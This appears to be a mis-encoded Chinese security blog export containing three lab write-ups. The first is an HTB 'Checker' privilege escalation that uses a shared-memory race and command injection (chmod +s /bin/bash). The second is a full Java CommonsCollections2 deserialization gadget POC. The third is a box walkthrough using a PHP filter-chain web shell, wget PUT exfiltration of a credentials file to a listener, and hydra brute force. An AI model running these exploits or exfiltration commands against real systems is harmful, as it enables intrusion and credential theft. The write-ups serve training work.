æ­¤å¯ä»¥ä½¿ç”¨bobæ¥ç»•è¿‡æ•°æ®åº“ä¸­ç”¨æˆ·çš„æ£€æµ‹\nå€¼å¾—æ³¨æ„çš„ç‚¹æ˜¯ï¼Œè¿™é‡Œå°†å“ˆå¸Œå€¼å†™å…¥å…±äº«å†…å­˜ï¼Œå¹¶é€šçŸ¥ç”¨æˆ·ã€‚ç„¶åæ¸…é™¤å…±äº«å†…å­˜ã€‚\nå…¶ä¸­æœ‰ä¸€ä¸ªsleepçš„å‡½æ•°è°ƒç”¨ï¼Œæ„å‘³ç€å…¶ä¸­æœ‰ä¸€ç§’ç©ºéš™ï¼Œå“ˆå¸Œå€¼æ˜¯å­˜åœ¨äºå…±äº«å†…å­˜ä¸­çš„ã€‚å…¶ä¸­çš„write_to_shmå‡½æ•°ä¸­æœ‰å…³äºå…±äº«å†…å­˜çš„é€»è¾‘éƒ¨åˆ†ã€‚\nwrite_to_shm #\rå¦‚ä½•è·å–åˆ°è¿™ä¸ªå…±äº«å†…å­˜åœ°å€å‘¢ï¼Ÿè·Ÿè¿›write_to_shmå‡½æ•°\n__int64 __fastcall write_to_shm(const char *a1)\r{\runsigned __int64 v1; // rbx\r__int64 v2; // rax\runsigned __int64 v3; // r12\runsigned int v4; // eax\rtime_t v5; // rax\runsigned __int64 v6; // rcx\runsigned int key; // [rsp+10h] [rbp-A0h]\rint shmid; // [rsp+14h] [rbp-9Ch]\rchar *v10; // [rsp+20h] [rbp-90h]\rconst char *s; // [rsp+28h] [rbp-88h]\rchar v12[88]; // [rsp+30h] [rbp-80h] BYREF\runsigned __int64 v13; // [rsp+88h] [rbp-28h]\rv1 = (unsigned __int64)v12;\rif ( _asan_option_detect_stack_use_after_return )\r{\rv2 = __asan_stack_malloc_0(64LL);\rif ( v2 )\rv1 = v2;\r}\r*(_QWORD *)v1 = 1102416563LL;\r*(_QWORD *)(v1 + 8) = \u0026#34;1 32 8 7 now:105\u0026#34;;\r*(_QWORD *)(v1 + 16) = write_to_shm;\rv3 = v1 \u0026gt;\u0026gt; 3;\r*(_DWORD *)(v3 + 2147450880) = -235802127;\r*(_DWORD *)(v3 + 2147450884) = -202116352;\rv13 = __readfsqword(0x28u);\rv4 = time(0LL);\rsrand(v4);\rkey = rand() % 0xFFFFF;\rshmid = shmget(key, 0x400uLL, 950);\rif ( shmid == -1 )\r{\rperror(\u0026#34;shmget\u0026#34;);\r__asan_handle_no_return();\rexit(1);\r}\rv10 = (char *)shmat(shmid, 0LL, 0);\rif ( v10 == (char *)-1LL )\r{\rperror(\u0026#34;shmat\u0026#34;);\r__asan_handle_no_return();\rexit(1);\r}\rv5 = time(0LL);\rif ( *(_BYTE *)(((v1 + 32) \u0026gt;\u0026gt; 3) + 0x7FFF8000) )\rv5 = __asan_report_store8(v1 + 32);\r*(_QWORD *)(v1 + 32) = v5;\rs = ctime((const time_t *)(v1 + 32));\rv6 = (unsigned __int64)\u0026amp;s[strlen(s) - 1];\rif ( *(_BYTE *)((v6 \u0026gt;\u0026gt; 3) + 0x7FFF8000) != 0 \u0026amp;\u0026amp; (char)(v6 \u0026amp; 7) \u0026gt;= *(_BYTE *)((v6 \u0026gt;\u0026gt; 3) + 0x7FFF8000) )\r__asan_report_store1(v6);\r*(_BYTE *)v6 = 0;\rsnprintf(v10, 0x400uLL, \u0026#34;Leaked hash detected at %s \u0026gt; %s\\n\u0026#34;, s, a1);\rshmdt(v10);\rif ( v12 == (char *)v1 )\r{\r*(_QWORD *)((v1 \u0026gt;\u0026gt; 3) + 0x7FFF8000) = 0LL;\r}\relse\r{\r*(_QWORD *)v1 = 1172321806LL;\r*(_QWORD *)((v1 \u0026gt;\u0026gt; 3) + 0x7FFF8000) = 0xF5F5F5F5F5F5F5F5LL;\r**(_BYTE **)(v1 + 56) = 0;\r}\rreturn key;\r} æ³¨æ„åˆ°è¿™é‡ŒğŸ‘‡ï¼Œä½¿ç”¨å½“å‰æ—¶é—´ç”Ÿæˆéšæœºæ•°ä½œä¸ºå…±äº«å†…å­˜çš„é”®ï¼Œå°è¯•è·å–å…±äº«å†…å­˜æ®µã€‚shmget çš„æƒé™è®¾ç½®ä¸º 950ã€‚\nv4 = time(0LL);\rsrand(v4);\rkey = rand() % 0xFFFFF;\rshmid = shmget(key, 0x400uLL, 950); é‚£ä¹ˆè¯´ï¼Œå¦‚æœæˆ‘ä»¬çš„è„šæœ¬ç”¨å½“å‰æ—¶é—´åšéšæœºæ•°ï¼Œä¹Ÿå¯ä»¥è·å–åˆ°è¿™ä¸ªå†…å­˜çš„åœ°å€å’¯ã€‚\nnotify_user #\rå‘ç°åœ¨è¿™ä¸ªå‡½æ•°ä¸­ï¼Œå­˜åœ¨ç€å‘½ä»¤æ‰§è¡Œçš„è¯­å¥ã€‚\nv16å˜é‡ç”¨äºå­˜å‚¨ä½¿ç”¨ snprintf è®¡ç®—å‡ºçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„é•¿åº¦ã€‚\nå†æ¬¡è°ƒç”¨ snprintfï¼Œå°†æ ¼å¼åŒ–åçš„ MySQL æŸ¥è¯¢å­˜å‚¨åœ¨ command ä¸­ã€‚è¿™æ¬¡ä¼šå®é™…å†™å…¥å­—ç¬¦ä¸²ã€‚\næœ€åå†popenæ‰§è¡Œå‘½ä»¤\nè¿™é‡Œçš„mysqlè¯­å¥æ˜¯ç›´æ¥æ‹¼æ¥çš„ï¼Œå¯ä»¥ä½¿ç”¨å¼•å·é€ƒé€¸æ‰ï¼Œåœ¨åé¢æ‹¼æ¥å‘½ä»¤\nå› æ­¤å¦‚æœèƒ½å¤Ÿæ§åˆ¶è¿™ä¸ªcommandçš„å†…å®¹ï¼Œå°±å¯ä»¥å†™å…¥å‘½ä»¤\nå…¶ä¸­v20é—´æ¥å’Œv5æœ‰å…³ï¼Œä¹Ÿå°±æ˜¯å’Œå½“å‰æ—¶é—´æˆ³çš„éšæœºæ•°æœ‰å…³\nå› æ­¤æ€»çš„æ€è·¯å°±æœ‰äº†\nå…ˆé€šè¿‡ v5 = write_to_shm(ptr); è·å–åˆ°å…±äº«å†…å­˜åœ°å€\rå†å†™å…¥ v20 å˜é‡è¿›è¡Œå‘½ä»¤æ‰§è¡Œ\ræœ€åä¸åœä¿®æ”¹å…±äº«å†…å­˜ï¼Œå¯¼è‡´ç›®æ ‡è„šæœ¬è¯»å–åˆ°ä¿®æ”¹åçš„å‘½ä»¤ è¿™é‡Œè¦æ³¨æ„å‡ ä¸ªç‚¹\nç¬¬ä¸€ä¸ªç‚¹ï¼Œå…±äº«å†…å­˜ä¸­å¿…é¡»è¦æœ‰Leaked hash detectedè¿™ä¸ªå­—ç¬¦ä¸²\nå¦åˆ™å°±ä¼šåƒè¿™æ ·æ— æ³•æ‰§è¡ŒğŸ˜­ğŸ‘‡\nç¬¬äºŒä¸ªç‚¹ï¼Œå­—ç¬¦ä¸²ä¸­å¿…é¡»è¦æœ‰å¤§äºç¬¦å·ï¼ˆASCIIç ä¸º62ï¼‰\nå¦åˆ™ä¼šæŠ¥è¿™ä¸ªé”™ğŸ˜­ğŸ‘‡\nPOC #\rè¿™æ˜¯æˆ‘ç”¨AIè·‘çš„ğŸ‘‡\n#include \u0026lt;stdio.h\u0026gt;\r#include \u0026lt;time.h\u0026gt;\r#include \u0026lt;stdlib.h\u0026gt;\r#include \u0026lt;sys/ipc.h\u0026gt;\r#include \u0026lt;sys/shm.h\u0026gt;\r#include \u0026lt;string.h\u0026gt;\rint main() {\runsigned int v4 = (unsigned int)time(NULL);\rsrand(v4);\r// ç”Ÿæˆéšæœºé”®\rkey_t key = rand() % 0xFFFFF;\r// è·å–å…±äº«å†…å­˜æ®µçš„æ ‡è¯†ç¬¦\rint shmid = shmget(key, 0x400, IPC_CREAT | 0666);\rif (shmid \u0026lt; 0) {\rperror(\u0026#34;shmget failed\u0026#34;);\rreturn 1;\r}\r// é™„åŠ å…±äº«å†…å­˜\rchar *share_memory = (char *)shmat(shmid, NULL, 0);\rif (share_memory == (char *)-1) {\rperror(\u0026#34;shmat failed\u0026#34;);\rreturn 1;\r}\r// ä¿®æ”¹å…±äº«å†…å­˜ä¸­çš„å†…å®¹ï¼Œå¿…é¡»è¦æœ‰å‰é¢çš„Leakedåˆ°\u0026gt;éƒ¨åˆ†\rconst char *message = \u0026#34;Leaked hash detected \u0026gt; \u0026#39;; chmod +s /bin/bash;#\u0026#34;;\rsnprintf(share_memory,0x400,\u0026#34;%s\u0026#34;, message ); // å°†æ¶ˆæ¯å¤åˆ¶åˆ°å…±äº«å†…å­˜\r// è¯»å–å¹¶æ‰“å°å…±äº«å†…å­˜ä¸­çš„å†…å®¹\rprintf(\u0026#34;Message in shared memory: %s\\n\u0026#34;, share_memory);\r// åˆ†ç¦»å…±äº«å†…å­˜\rif (shmdt(share_memory) == -1) {\rperror(\u0026#34;shmdt failed\u0026#34;);\rreturn 1;\r}\rreturn 0;\r} ä½¿ç”¨gccç¼–è¯‘å¥½ï¼Œç„¶åä¼ åˆ°é¶æœºä¸Š\ngcc -o test test.c ç„¶åæŒç»­æ‰§è¡Œ\nwhile true; do ./test; done æœ€åsudoæ‰§è¡Œé‚£ä¸ªæ£€æŸ¥å‘½ä»¤ï¼Œå¾—åˆ°çš„æ­£ç¡®å›æ˜¾åº”è¯¥æ˜¯mysqlæŠ¥é”™ï¼Œä½†æ˜¯ä¸å½±å“åé¢ææƒçš„éƒ¨åˆ†\nSummary #\rè¿™æ˜¯ä¸€é“å¾ˆæœ‰è´¨é‡çš„é¢˜ç›®ï¼ä¸ä»…æœ‰Webï¼Œè¿˜åŒ…å«äº†é€†å‘çš„éƒ¨åˆ†ã€‚\nUserï¼šTeampassçš„**SQLæ³¨å…¥æ¼æ´æ‹¿åˆ°å¯†ç å“ˆå¸Œå€¼ï¼Œç ´è§£åè·å–åˆ°readerçš„sshå¯†ç ï¼Œä½†æ˜¯éœ€è¦éªŒè¯ç ã€‚ç™»å½•åˆ°äº†Bookstack**ï¼Œé€šè¿‡SSRFæ¼æ´è¯»å–å¯†é’¥å€¼ï¼Œç”ŸæˆéªŒè¯ç åè¿›è¡ŒSSHç™»å½•ã€‚ï¼ˆå¯èƒ½éœ€è¦åˆ‡æ¢èŠ‚ç‚¹\nRootï¼šIDAåç¼–è¯‘check-leakè„šæœ¬ï¼Œå‘ç°å­˜åœ¨æ¡ä»¶ç«äº‰æ¼æ´ï¼Œå…±äº«å†…å­˜åœ¨ä¸€ç§’é’Ÿçš„æ—¶é—´å†…æ˜¯å¯ä»¥å†™çŠ¶æ€ï¼Œä¹‹åå†…å­˜ä¸­çš„å‘½ä»¤ä¼šè¢«å¸¦åˆ°å‘½ä»¤è¡Œä¸­æ‹¼æ¥ä¸ºmysqlæŸ¥è¯¢å‘½ä»¤ï¼Œè¿™é‡Œå¯ä»¥ç›´æ¥å¼•å·é—­åˆæ‹¼æ¥å‘½ä»¤ã€‚è¦æ³¨æ„çš„æ˜¯è„šæœ¬å¯¹å†…å­˜ä¸­çš„å­—ç¬¦ä¸²å†…å®¹æœ‰æ£€æŸ¥ï¼Œå¦åˆ™åˆ°ä¸äº†mysqlé‚£ä¸€æ­¥ã€‚\n","date":"2025-02-27","externalUrl":null,"permalink":"/posts/2025/02/htb-checker/","section":"Posts","summary":"","title":"HTB-Checker","type":"posts"},{"content":"","date":"2025-02-26","externalUrl":null,"permalink":"/tags/commoncollections/","section":"Tags","summary":"","title":"Commoncollections","type":"tags"},{"content":"\rEnvironment #\rPom.xml\n\u0026lt;dependency\u0026gt;\r\u0026lt;groupId\u0026gt;org.apache.commons\u0026lt;/groupId\u0026gt;\r\u0026lt;artifactId\u0026gt;commons-collections4\u0026lt;/artifactId\u0026gt;\r\u0026lt;version\u0026gt;4.0\u0026lt;/version\u0026gt;\r\u0026lt;/dependency\u0026gt;\r\u0026lt;dependency\u0026gt;\r\u0026lt;groupId\u0026gt;org.javassist\u0026lt;/groupId\u0026gt;\r\u0026lt;artifactId\u0026gt;javassist\u0026lt;/artifactId\u0026gt;\r\u0026lt;version\u0026gt;3.22.0-GA\u0026lt;/version\u0026gt;\r\u0026lt;/dependency\u0026gt; TemplatesImpI #\rè¿™ä¸ªç±»ç”¨äºåŠ è½½æ¶æ„ç±»ï¼Œå½“å£°æ˜ä¸€ä¸ªå®ä¾‹çš„æ—¶å€™ä¼šè§¦å‘getTransletInstanceæ–¹æ³•\næŸ¥çœ‹getTransletInstanceä¸­**_name**å˜é‡ä¸ºç©ºåˆ™ç›´æ¥è¿”å›\nå½“**_classå˜é‡è®¾ç½®ä¸ºäº†null**ï¼Œé‚£ä¹ˆä¼šè¿›å…¥**defineTransletClasses()**æ–¹æ³•\nåˆ†æ**defineTransletClasses()**æ–¹æ³•ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªçˆ¶ç±»çš„åˆ¤æ–­\nè·Ÿè¿›æŸ¥çœ‹ABSTRACT_TRANSLETå˜é‡å¯ä»¥çŸ¥é“ï¼Œä»–æ˜¯ä¸€ä¸ªé™æ€å¸¸é‡\nå› æ­¤åªéœ€è¦æ„é€ ä¸€ä¸ªæ¶æ„ç±»ç„¶åç»§æ‰¿ä»–ï¼Œåœ¨è¿›è¡Œequalåˆ¤æ–­çš„æ—¶å€™ï¼Œä»–çš„çˆ¶ç±»å°±æ˜¯ABSTRACT_TRANSLETçš„å€¼ï¼Œéšåå°†**_transletIndex**è®¾ç½®ä¸º0åé€€å‡º\nå¦‚ä¸‹æ„é€ ä¸€ä¸ªæ¶æ„ç±»ï¼Œéœ€è¦æ·»åŠ ä¸€ä¸ªpsvmç„¶åè¿è¡Œä¸€ä¸‹ï¼Œä¾¿ä¼šåœ¨**/outputç›®å½•ä¸‹å¾—åˆ°evil.class**ï¼Œæ³¨æ„ä¸èƒ½æ˜¯å¼•ç”¨evil.javaï¼\nimport com.sun.org.apache.xalan.internal.xsltc.DOM;\rimport com.sun.org.apache.xalan.internal.xsltc.TransletException;\rimport com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\rimport com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;\rimport com.sun.org.apache.xml.internal.serializer.SerializationHandler;\rpublic class evil extends AbstractTranslet {\rstatic {\rtry{\rRuntime.getRuntime().exec(\u0026#34;calc\u0026#34;);\r}catch (Exception e){\re.printStackTrace();\r}\r}\rpublic static void main(String[] args) {\r}\r@Override\rpublic void transform(DOM document, SerializationHandler[] handlers) throws TransletException {\r}\r@Override\rpublic void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {\r}\r} ç”±äº**_name**ã€_bytecodeséƒ½æ˜¯ç§æœ‰å˜é‡ï¼Œåªèƒ½é€šè¿‡åå°„çš„æ–¹å¼ç»™å…¶è®¾ç½®\næ³¨æ„readObjectæ–¹æ³•ä¸­çš„**_tfactory**å˜é‡åŒæ ·éœ€è¦è®¾ç½® ï¼Œå¦åˆ™ä¼šæŠ¥å‡ºç©ºæŒ‡é’ˆå¼‚å¸¸\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\rimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\rimport org.junit.Test;\rimport java.lang.reflect.Field;\rimport java.nio.file.Files;\rimport java.nio.file.Paths;\rpublic class CC2TEST {\r@Test\rpublic void test() throws Exception {\rTemplatesImpl templates = new TemplatesImpl();\rClass\u0026lt;? extends TemplatesImpl\u0026gt; aClass = templates.getClass();\rField name_field = aClass.getDeclaredField(\u0026#34;_name\u0026#34;);\rname_field.setAccessible(true);\rname_field.set(templates,\u0026#34;name\u0026#34;); // è®¾ç½®_nameå˜é‡ä¸ä¸ºç©º _classæ— éœ€è®¾ç½®ï¼Œéœ€è¦è¿›å…¥defineTransletClasses\r//ä¸‹é¢è¯»å–æ¶æ„ç±»çš„å­—èŠ‚ç \rField bytecodes_field = aClass.getDeclaredField(\u0026#34;_bytecodes\u0026#34;);\rbytecodes_field.setAccessible(true);\rbyte[] bytes = Files.readAllBytes(Paths.get(\u0026#34;E:\\\\CC1\\\\test\\\\target\\\\test-classes\\\\evil.class\u0026#34;));\rbyte[][] bytes1 ={bytes}; //éœ€è¦å°†å­—èŠ‚ç è½¬ä¸ºäºŒç»´æ•°ç»„ï¼Œç¬¦åˆå½¢å‚\rbytecodes_field.set(templates,bytes1);\r}\r} è°ƒè¯•å¯ä»¥çœ‹åˆ°ï¼Œå­—èŠ‚ç çš„è¿˜åŸè®©class[0]å˜æˆäº†evilç±»\nç„¶åè·³å‡ºå¾ªç¯æ¥åˆ°getTransletInstanceæ–¹æ³•ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œé’ˆå¯¹evilç±»è¿›è¡Œäº†å®ä¾‹åŒ–ï¼Œå› æ­¤è§¦å‘äº†æ¶æ„æ„é€ æ–¹æ³•ã€‚\nTransformingComparator #\rè¿™ä¸ªç±»ä½¿ç”¨äº†Serializableæ¥å£ï¼Œå¯ä»¥è¢«åºåˆ—åŒ–\nå…¶ä¸­ä¸€ä¸ªå‚æ•°æ˜¯transformerï¼Œå¹¶ä¸”åœ¨è§¦å‘compareæ–¹æ³•çš„æ—¶å€™ï¼Œå¯¹è¿™ä¸ªå‚æ•°è°ƒç”¨äº†transformæ–¹æ³•\nå¦‚æœtransformerçš„å€¼ä¸ºInvokerTransformerï¼Œé‚£ä¹ˆä»–çš„è°ƒç”¨æ–¹å¼å°±å’ŒCC1é“¾ä¸€æ ·\nPriorityQueue #\ræ¥ä¸‹æ¥å°±æ˜¯è¦è§¦å‘ä»–çš„compareæ–¹æ³•ï¼Œè¿™ä¸ªç±»åŒæ ·ç»§æ‰¿äº†åºåˆ—åŒ–æ¥å£\næŸ¥çœ‹heapifyæ–¹æ³•\nè·Ÿè¿›siftDownæ–¹æ³•\nå†è·Ÿè¿›\nåœ¨siftDownUsingComparatoræ–¹æ³•ä¸­çœ‹åˆ°äº†éœ€è¦çš„compareæ–¹æ³•\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\rimport org.apache.commons.collections4.comparators.TransformingComparator;\rimport org.apache.commons.collections4.functors.InvokerTransformer;\rimport org.junit.Test;\rimport java.io.ObjectInputStream;\rimport java.io.ObjectOutputStream;\rimport java.lang.reflect.Field;\rimport java.nio.file.Files;\rimport java.nio.file.Paths;\rimport java.util.PriorityQueue;\rpublic class CC2TEST {\r@Test\rpublic void test() throws Exception {\rTemplatesImpl templates = new TemplatesImpl();\rClass\u0026lt;? extends TemplatesImpl\u0026gt; aClass = templates.getClass();\rField name_field = aClass.getDeclaredField(\u0026#34;_name\u0026#34;);\rname_field.setAccessible(true);\rname_field.set(templates,\u0026#34;name\u0026#34;); // è®¾ç½®_nameå˜é‡ä¸ä¸ºç©º _classæ— éœ€è®¾ç½®ï¼Œéœ€è¦è¿›å…¥defineTransletClasses\r//ä¸‹é¢è¯»å–æ¶æ„ç±»çš„å­—èŠ‚ç \rField bytecodes_field = aClass.getDeclaredField(\u0026#34;_bytecodes\u0026#34;);\rbytecodes_field.setAccessible(true);\rbyte[] bytes = Files.readAllBytes(Paths.get(\u0026#34;E:\\\\CC1\\\\test\\\\target\\\\test-classes\\\\evil.class\u0026#34;));\rbyte[][] bytes1 ={bytes}; //éœ€è¦å°†å­—èŠ‚ç è½¬ä¸ºäºŒç»´æ•°ç»„ï¼Œç¬¦åˆå½¢å‚\rbytecodes_field.set(templates,bytes1);\r//åå°„è°ƒç”¨newTransformer\rInvokerTransformer transformer = new InvokerTransformer\u0026lt;\u0026gt;(\u0026#34;newTransformer\u0026#34;,new Class[]{},new Object[]{});\rTransformingComparator comparator = new TransformingComparator(transformer);\rPriorityQueue queue = new PriorityQueue(comparator);\rqueue.add(templates);\rqueue.add(2);\rserialize(queue);\rdeserialize();\r}\rpublic static void serialize(Object o) throws Exception {\rtry (ObjectOutputStream oos = new ObjectOutputStream(Files.newOutputStream(Paths.get(\u0026#34;ser.ser\u0026#34;)))) {\roos.writeObject(o);\r}\r}\rpublic static Object deserialize() throws Exception {\rtry (ObjectInputStream ois = new ObjectInputStream(Files.newInputStream(Paths.get(\u0026#34;ser.ser\u0026#34;)))) {\rreturn ois.readObject();\r}\r}\r} è¿™é‡Œä¼šæŠ¥é”™è¯´æ‰¾ä¸åˆ°è¿™ä¸ªæ–¹æ³•\nè·Ÿè¿›PriorityQueue.add.offer.siftUp.siftUpUsingComparator\nå‘ç°åœ¨æ·»åŠ é˜Ÿåˆ—çš„æ—¶å€™ï¼Œå°±ä¼šè§¦å‘compareæ–¹æ³•ï¼Œè€Œæå‰ä¼ è¿›å…¥çš„InvokerTransformä¼šåœ¨ä¼ å…¥çš„æ•´æ•°ä¸Šè°ƒç”¨newTransformerï¼Œä½†æ˜¯æ‰¾ä¸åˆ°ï¼Œå› æ­¤ä¼šè¢«æå‰æ‰§è¡Œã€‚\næ‰€ä»¥ä»ç„¶éœ€è¦ä½¿ç”¨åå°„æ¥è¿›è¡Œè®¾ç½®\nPOC #\rimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\rimport org.apache.commons.collections4.comparators.TransformingComparator;\rimport org.apache.commons.collections4.functors.ConstantTransformer;\rimport org.apache.commons.collections4.functors.InvokerTransformer;\rimport org.junit.Test;\rimport java.io.ObjectInputStream;\rimport java.io.ObjectOutputStream;\rimport java.lang.reflect.Field;\rimport java.nio.file.Files;\rimport java.nio.file.Paths;\rimport java.util.PriorityQueue;\rpublic class CC2TEST {\r@Test\rpublic void test() throws Exception {\rTemplatesImpl templates = new TemplatesImpl();\rClass\u0026lt;? extends TemplatesImpl\u0026gt; aClass = templates.getClass();\rField name_field = aClass.getDeclaredField(\u0026#34;_name\u0026#34;);\rname_field.setAccessible(true);\rname_field.set(templates,\u0026#34;name\u0026#34;); // è®¾ç½®_nameå˜é‡ä¸ä¸ºç©º _classæ— éœ€è®¾ç½®ï¼Œéœ€è¦è¿›å…¥defineTransletClasses\r//ä¸‹é¢è¯»å–æ¶æ„ç±»çš„å­—èŠ‚ç \rField bytecodes_field = aClass.getDeclaredField(\u0026#34;_bytecodes\u0026#34;);\rbytecodes_field.setAccessible(true);\rbyte[] bytes = Files.readAllBytes(Paths.get(\u0026#34;E:\\\\CC1\\\\test\\\\target\\\\test-classes\\\\evil.class\u0026#34;));\rbyte[][] bytes1 ={bytes}; //éœ€è¦å°†å­—èŠ‚ç è½¬ä¸ºäºŒç»´æ•°ç»„ï¼Œç¬¦åˆå½¢å‚\rbytecodes_field.set(templates,bytes1);\r//åå°„è°ƒç”¨newTransformer\rInvokerTransformer invokerTransformer = new InvokerTransformer\u0026lt;\u0026gt;(\u0026#34;newTransformer\u0026#34;,new Class[]{},new Object[]{});\r//å…ˆå°†transformerèµ‹å€¼\rTransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1));\rPriorityQueue queue = new PriorityQueue(transformingComparator);\r//æ·»åŠ æ¶æ„ç±»\rqueue.add(templates);\rqueue.add(1);\r//é€šè¿‡åå°„ä¿®æ”¹TransformingComparatorçš„transformer\rField transformer1 = transformingComparator.getClass().getDeclaredField(\u0026#34;transformer\u0026#34;);\rtransformer1.setAccessible(true);\rtransformer1.set(transformingComparator,invokerTransformer);\rserialize(queue);\rdeserialize();\r}\rpublic static void serialize(Object o) throws Exception {\rtry (ObjectOutputStream oos = new ObjectOutputStream(Files.newOutputStream(Paths.get(\u0026#34;ser.ser\u0026#34;)))) {\roos.writeObject(o);\r}\r}\rpublic static Object deserialize() throws Exception {\rtry (ObjectInputStream ois = new ObjectInputStream(Files.newInputStream(Paths.get(\u0026#34;ser.ser\u0026#34;)))) {\rreturn ois.readObject();\r}\r}\r} å‚è€ƒæ–‡ç« \nCommonsCollections2åˆ†æ-CSDNåšå®¢\nJava\u0026ndash;cc2é“¾ååºåˆ—åŒ–æ¼æ´\u0026amp;è¶…çº§æ¸…æ™°è¯¦ç»† - Erichas - åšå®¢å›­\n","date":"2025-02-26","externalUrl":null,"permalink":"/posts/2025/02/commoncollections-2/","section":"Posts","summary":"","title":"CommonCollections-2","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali/swiss â¯ nmap 172.17.0.2 -sV -A\rStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-25 19:53 CST\rNmap scan report for realgob.dl (172.17.0.2)\rHost is up (0.00026s latency).\rNot shown: 998 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: |_ 256 f1:2d:b0:54:e3:57:94:c8:3a:1a:7a:ba:d8:2d:7e:f9 (ECDSA)\r80/tcp open tcpwrapped\r|_http-server-header: Apache/2.4.58 (Ubuntu)\r|_http-title: \\xF0\\x9F\\x91\\x8B Mario \\xC3\\x81lvarez Fer\\xC5\\x84andez\rMAC Address: 02:42:AC:11:00:02 (Unknown)\rNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\rTCP/IP fingerprint:\rOS:SCAN(V=7.94SVN%E=4%D=2/25%OT=22%CT=1%CU=40368%PV=Y%DS=1%DC=D%G=Y%M=0242A\rOS:C%TM=67BDAF4F%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=107%TI=Z%CI=Z%I\rOS:I=I%TS=A)SEQ(SP=107%GCD=2%ISR=107%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M5B4ST11NW7\rOS:%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B4ST11NW7%O6=M5B4ST1\rOS:1)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%\rOS:W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=\rOS:Y%DF=N%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T2(R=Y%DF=N%T=40%W=0%S=O%A=Z%F=R%\rOS:O=%RD=0%Q=)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=\rOS:Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%\rOS:RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%I\rOS:PL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)\rNetwork Distance: 1 hop\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\rTRACEROUTE\rHOP RTT ADDRESS\r1 0.25 ms realgob.dl (172.17.0.2)\rOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 17.18 seconds ffuf #\ræ‰«æå¾—åˆ°ä¸€ä¸ªfileå‚æ•°å¯ä»¥è¿›è¡Œè¯»å–æ–‡ä»¶\næŸ¥çœ‹åˆ°å­˜åœ¨darksç”¨æˆ·\nè¿™é‡Œä¾æ—§å¯ä»¥ä½¿ç”¨filterchainsæ”»å‡»\nsynacktiv/php_filter_chain_generator [root@kali] /home/kali/swiss/php_filter_chain_generator (main) â¯ python php_filter_chain_generator.py --chain \u0026#39;\u0026lt;?php system($_POST[\u0026#34;cmd\u0026#34;]);?\u0026gt;\u0026#39; åœ¨è¯¥ç›®å½•ä¸‹å‘ç°äº†ä¸€ä¸ªå¾ˆå¤§çš„txtæ–‡ä»¶\nç”±äºå¤ªå¤§æ— æ³•æŸ¥çœ‹ï¼Œè¿™é‡Œæˆ‘æŠŠæ–‡ä»¶ä¼ åˆ°äº†kali\ncmd=wget --method=PUT --body-file=credentials.txt http://172.17.0.1:1000 kali\nâ¯ nc -lvnp 1000 \u0026gt; get.txt ä½¿ç”¨stringsè¯»å–ç„¶ågrepè¿‡æ»¤æŸ¥æ‰¾ï¼ˆå› ä¸ºæœ‰ä¸€éƒ¨åˆ†äºŒè¿›åˆ¶ç ï¼Œä½¿ç”¨catè¿‡æ»¤ç»™grepä¼šæŠ¥é”™\nå¾—åˆ°å¯†ç ï¼š_dkvndsqwcdfef34445\nHydra #\rå¦ä¸€ç§è·å–å¯†ç çš„æ–¹å¼å°±æ˜¯æš´åŠ›ç ´è§£ç½‘ç«™é‡Œçš„ç™»å½•å£\n[root@kali] /home/kali/swiss â¯ hydra -l administrator -P /usr/share/wordlists/rockyou.txt 172.17.0.2 http-post-form \u0026#39;/sobre-mi/login.php:username=^USER^\u0026amp;password=^PASS^:F=Usuario o contraseÃ±a incorrectos.\u0026#39; -f -t 64 -I User #\rç›´æ¥ä½¿ç”¨sshç™»å½•æ˜¯ä¸å¯ä»¥çš„\nåœ¨ä¸Šçº§ç›®å½•çœ‹åˆ°ä¸€ä¸ªæ–‡ä»¶ï¼ŒåŒæ ·å°†å…¶è½¬å‡ºæ¥\næŸ¥çœ‹å¯è§å­—ç¬¦å‘ç°ä¸€ä¸ªIPåœ°å€ï¼š172.17.0.188\nä¼¼ä¹æ˜¯ä»–ä¼šå‘172.17.0.188å‘é€ä¸€äº›ä¸œè¥¿ï¼Ÿç„¶åå‘é€å¤±è´¥äº†ï¼Ÿï¼Œä¸ºäº†èƒ½å¤ŸæŠ“åˆ°åŒ…ï¼Œéœ€è¦æ·»åŠ ç½‘ç»œæ¥å£\n[root@kali] ~kali/swiss â¯ ip addres add 172.17.0.188/24 dev docker0 